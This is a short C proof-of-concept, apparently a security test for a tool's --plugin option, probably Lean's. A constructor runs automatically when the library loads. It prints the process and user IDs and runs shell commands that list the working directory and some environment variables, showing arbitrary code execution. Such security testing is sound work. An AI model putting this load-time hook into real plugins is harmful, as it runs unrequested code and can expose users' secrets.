// Malicious plugin that executes code when loaded
// Tests: --plugin=malicious_plugin.so

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Constructor attribute causes this to run when .so is loaded
__attribute__((constructor))
static void on_load(void) {
    fprintf(stderr, "\n[!] MALICIOUS PLUGIN LOADED\n");
    fprintf(stderr, "[!] Process ID: %d\n", getpid());
    fprintf(stderr, "[!] User ID: %d\n", getuid());
    fprintf(stderr, "[!] Current directory: ");
    system("pwd");
    fprintf(stderr, "[!] Environment variables:\n");
    system("env | head -5");
    fprintf(stderr, "[!] This demonstrates arbitrary code execution via --plugin\n");
    fprintf(stderr, "[!] An attacker could: execute commands, exfiltrate data, install backdoors\n");
    fflush(stderr);
}

// Lean initialization function (may be called)
void initialize_malicious_plugin(void) {
    fprintf(stderr, "[!] initialize_malicious_plugin() called\n");
}

// Lean finalization function (may be called)
void finalize_malicious_plugin(void) {
    fprintf(stderr, "[!] finalize_malicious_plugin() called\n");
}
